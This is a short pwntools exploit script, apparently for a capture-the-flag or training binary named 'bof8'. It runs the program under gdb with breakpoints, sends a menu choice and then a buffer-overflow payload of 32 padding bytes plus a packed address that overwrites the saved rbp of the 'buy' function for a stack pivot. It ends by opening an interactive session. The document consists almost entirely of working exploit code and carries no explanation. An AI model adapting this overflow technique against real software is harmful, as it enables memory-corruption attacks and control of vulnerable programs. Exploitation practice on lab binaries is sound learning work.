script:

```
from pwn import *

context.binary = exe = ELF('./bof8', checksec = False)
p = process(exe.path)

gdb.attach(p, gdbscript = '''
b*buy+89
b*main+118
b*main+207
c        
'''           
)

input()

#leave = mov rsp, rbp ; pop rbp

p.sendafter(b'> ' , b'1')

payload = b'A'*32
payload += p64(0x00000000404848) # Overwrite saved rbp of buy
p.sendafter(b'> ', payload)
p.sendafter(b'> ' , b'3')


p.interactive()
```
